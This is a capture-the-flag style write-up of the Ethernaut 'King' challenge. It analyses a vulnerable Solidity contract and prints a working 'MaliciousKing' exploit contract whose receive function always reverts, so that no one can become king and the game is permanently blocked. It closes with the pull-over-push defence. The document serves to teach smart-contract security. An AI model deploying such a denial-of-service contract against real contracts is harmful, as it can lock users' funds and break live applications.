# Ethernaut Challenge #9: King

**Objective:** Break the contract so no one else can become king.

**Contract Analysis:**
```solidity
contract King {
  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

**The Vulnerability:**

Line 15: `payable(king).transfer(msg.value);`

**The Attack:**

1. Become king by sending enough ETH
2. Your contract becomes king
3. Next person tries to become king
4. Contract tries: `payable(yourContract).transfer(eth)`
5. **Your contract REJECTS the transfer!**
6. Transaction reverts
7. No one can ever become king again

**Malicious King Contract:**
```solidity
contract MaliciousKing {
  function becomeKing(address _kingContract) public payable {
    // Become king
    (bool success,) = _kingContract.call{value: msg.value}("");
    require(success);
  }
  
  // Reject ALL incoming ETH
  receive() external payable {
    revert("I am the eternal king");
  }
}
```

**Why This Works:**

`transfer()` and `send()` forward 2300 gas.
If recipient uses > 2300 gas, transaction fails.

But `revert()` works with just 2300 gas!

**The Lesson:**

External calls to unknown addresses are dangerous. They can:
- Revert intentionally (DOS)
- Run out of gas
- Execute malicious code

**Use pull over push:**
- Don't send ETH to users
- Let users withdraw their own ETH

**Status:** Challenge understood. DOS via revert.
